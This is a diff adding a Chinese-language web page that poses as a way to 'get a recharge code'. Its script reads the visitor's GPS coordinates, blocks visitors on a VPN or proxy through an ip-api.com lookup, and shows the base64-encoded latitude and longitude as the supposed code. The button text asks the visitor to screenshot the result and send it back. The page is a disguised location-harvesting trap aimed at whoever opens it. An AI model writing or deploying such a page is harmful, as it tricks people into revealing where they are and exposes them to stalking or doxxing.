@@ -1,0 +1,111 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>充值码获取</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f4f4f9;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .container {
+            text-align: center;
+            background-color: #fff;
+            padding: 30px;
+            border-radius: 8px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+        }
+        h1 {
+            color: #333;
+        }
+        button {
+            padding: 10px 20px;
+            font-size: 16px;
+            color: #fff;
+            background-color: #007bff;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+        }
+        button:hover {
+            background-color: #0056b3;
+        }
+        #location {
+            margin-top: 20px;
+            padding: 10px;
+            border: 1px solid #ccc;
+            width: fit-content;
+            display: inline-block;
+        }
+        .error {
+            color: red;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>获取充值码</h1>
+        <button onclick="getLocation()">点击获取充值码(请同意获取位置并截图给我，用于测试你是否在骗我)</button>
+        <div id="location"></div>
+    </div>
+
+    <script>
+        async function getLocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(async (position) => {
+                    const latitude = position.coords.latitude;
+                    const longitude = position.coords.longitude;
+                    const locationString = `${latitude},${longitude}`;
+                    const encodedLocation = btoa(locationString);
+
+                    // Check for VPN using ip-api.com API
+                    try {
+                        const response = await fetch('http://ip-api.com/json/');
+                        const data = await response.json();
+
+                        if (data.proxy || data.hosting) {
+                            document.getElementById("location").innerHTML = '<span class="error">检测到您可能使用了VPN，请使用真实网络。</span>';
+                        } else {
+                            document.getElementById("location").innerHTML = `充值码: ${encodedLocation}`;
+                        }
+                    } catch (error) {
+                        console.error("Error fetching IP info:", error);
+                        document.getElementById("location").innerHTML = '<span class="error">无法验证您的IP地址，请稍后再试</span>';
+                    }
+                }, showError);
+            } else { 
+                document.getElementById("location").innerHTML = '<span class="error">充值码获取失败，请同意获取位置，并且要截图给我</span>';
+            }
+        }
+
+        function showError(error) {
+            let errorMessage;
+            switch(error.code) {
+                case error.PERMISSION_DENIED:
+                    errorMessage = "User denied the request for Geolocation."
+                    break;
+                case error.POSITION_UNAVAILABLE:
+                    errorMessage = "Location information is unavailable."
+                    break;
+                case error.TIMEOUT:
+                    errorMessage = "The request to get user location timed out."
+                    break;
+                case error.UNKNOWN_ERROR:
+                    errorMessage = "An unknown error occurred."
+                    break;
+            }
+            document.getElementById("location").innerHTML = `<span class="error">${errorMessage}</span>`;
+        }
+    </script>
+</body>
+</html>
+
+
+
